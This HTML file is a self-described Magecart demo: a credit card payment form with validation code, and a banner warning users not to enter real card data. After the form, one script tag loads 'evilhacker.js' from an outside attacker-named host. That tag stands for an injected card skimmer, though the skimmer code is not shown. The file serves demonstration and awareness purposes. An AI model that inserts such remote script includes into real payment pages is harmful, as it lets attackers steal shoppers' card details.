<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Form (Magecart Demo)</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f0f0;
        }

        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input[type="text"],
        input[type="number"],
        select {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .expiry-cvv-container {
            display: flex;
            justify-content: space-between;
        }
        .expiry-container{
             width: 48%;
        }
        .cvv-container {
            width: 48%;
        }

        button {
            background-color: #007bff;
            color: #fff;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }

        button:hover {
            background-color: #0056b3;
        }

        .error {
            color: red;
            margin-top: 5px;
        }
        .warning {
          background-color: #fff3cd;
          border: 1px solid #ffecb5;
          color: #856404;
          padding: 10px;
          margin-bottom: 10px;
          border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="warning">
      <strong>Magecart Demo:</strong> This is a simplified demonstration of a Magecart-style attack.  In a real attack, the malicious script would be injected more subtly (e.g., through a compromised third-party library, supply chain attack, or XSS vulnerability).  Do not enter real credit card information.
    </div>
    <form action="/anything/post" method="POST" id="credit-card-form">
        <label for="card-number">Card Number:</label>
        <input type="text" id="card-number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required>
        <div class="error" id="card-number-error"></div>


        <div class="expiry-cvv-container">
            <div class="expiry-container">
                <label for="expiry-month">Expiry Date:</label>
                 <select id="expiry-month" name="expiry_month" required>
                    <option value="" disabled selected>MM</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>
                 <select id="expiry-year" name="expiry_year" required>
                   <option value="" disabled selected>YY</option>
                    <script>
                        const currentYear = new Date().getFullYear() % 100;
                        for (let i = 0; i < 10; i++) {
                            const year = currentYear + i;
                            const yearStr = String(year).padStart(2, '0');
                            document.write(`<option value="${yearStr}">${yearStr}</option>`);
                        }
                    </script>
                </select>
                 <div class="error" id="expiry-date-error"></div>
            </div>

            <div class="cvv-container">
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="4" required pattern="[0-9]{3,4}">
                <div class="error" id="cvv-error"></div>
            </div>
        </div>

        <label for="cardholder-name">Cardholder Name:</label>
        <input type="text" id="cardholder-name" name="cardholder_name" placeholder="John Doe" required>
        <div class="error" id="cardholder-name-error"></div>

        <button type="submit">Submit Payment</button>
    </form>

    <script src="https://evilhacker.edgecompute.app/static-asset/evilhacker.js"></script>

    <script>
        const form = document.getElementById('credit-card-form');
        const cardNumberInput = document.getElementById('card-number');
        const expiryMonthInput = document.getElementById('expiry-month');
        const expiryYearInput = document.getElementById('expiry-year');
        const cvvInput = document.getElementById('cvv');
        const cardholderNameInput = document.getElementById('cardholder-name');

        const cardNumberError = document.getElementById('card-number-error');
        const expiryDateError = document.getElementById('expiry-date-error');
        const cvvError = document.getElementById('cvv-error');
        const cardholderNameError = document.getElementById('cardholder-name-error');

        form.addEventListener('submit', (event) => {
            let isValid = true;

            // Clear previous errors
            cardNumberError.textContent = '';
            expiryDateError.textContent = '';
            cvvError.textContent = '';
            cardholderNameError.textContent = '';

            // Card Number Validation (Basic)
            const cardNumber = cardNumberInput.value.replace(/\s/g, ''); // Remove spaces
             if (!/^\d{13,19}$/.test(cardNumber)) {
                cardNumberError.textContent = 'Invalid card number';
                isValid = false;
             }
            // Luhn Algorithm Check (More Robust)
            if (!luhnCheck(cardNumber)) {
                 cardNumberError.textContent = 'Invalid card number (Luhn check failed)';
                isValid = false;
            }


            // Expiry Date Validation
            const expiryMonth = expiryMonthInput.value;
            const expiryYear = expiryYearInput.value;
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;

              if (!expiryMonth || !expiryYear)
              {
                  expiryDateError.textContent = "Please select month and year";
                  isValid = false;
              }
               else if (parseInt(expiryYear) < currentYear || (parseInt(expiryYear) === currentYear && parseInt(expiryMonth) < currentMonth)) {
                expiryDateError.textContent = 'Card has expired';
                isValid = false;
            }


            // CVV Validation
            const cvv = cvvInput.value;
            if (!/^[0-9]{3,4}$/.test(cvv)) {
                cvvError.textContent = 'Invalid CVV';
                isValid = false;
            }

            // Cardholder Name Validation (Basic)
            const cardholderName = cardholderNameInput.value.trim();
             if (cardholderName === '') {
               cardholderNameError.textContent = 'Cardholder name is required';
               isValid = false;
             }

            if (!isValid) {
                event.preventDefault();
            }
        });

        function luhnCheck(cardNumber) {
            let sum = 0;
            let alternate = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let n = parseInt(cardNumber.substring(i, i + 1));
                if (alternate) {
                    n *= 2;
                    if (n > 9) {
                        n = (n % 10) + 1;
                    }
                }
                sum += n;
                alternate = !alternate;
            }
            return (sum % 10) === 0;
        }

        cardNumberInput.addEventListener('input', (event) => {
          let value = event.target.value.replace(/\D/g, '');
          let formattedValue = '';
          for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
              formattedValue += ' ';
            }
            formattedValue += value[i];
          }
            event.target.value = formattedValue;
        });

        cvvInput.addEventListener('input', (event) => {
            event.target.value = event.target.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
